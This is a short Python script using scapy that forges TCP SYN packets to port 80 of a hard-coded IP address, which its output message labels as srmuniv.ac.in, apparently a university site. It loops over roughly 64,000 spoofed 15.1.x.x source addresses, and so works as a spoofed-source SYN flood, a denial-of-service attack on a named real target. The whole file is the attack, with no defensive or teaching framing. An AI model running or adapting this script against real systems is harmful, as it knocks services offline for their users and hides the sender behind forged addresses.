from scapy.all import *
def func(src,dst,s_port):
   p = IP(src = src, dst = dst)/TCP(sport = s_port, dport = 80,seq=1000,ack=1023,window=1000,flags="S")
   send(p)
   print "SENT PACKET --> srmuniv.ac.in from source %s and port %s"%(src,s_port)
   ans,unans=srloop(p,inter=0.3,retry=2,timeout=4)
   print ans.summary()
   print unans.summary()
	  
def main():
   dst = "50.62.160.77"
   for i in range(1,254):
      for j in range(1,254):
         src = "15.1.%s.%s"%(i,j)     
         func(src,dst,1025+i+j)
if __name__ == "__main__":
   main()
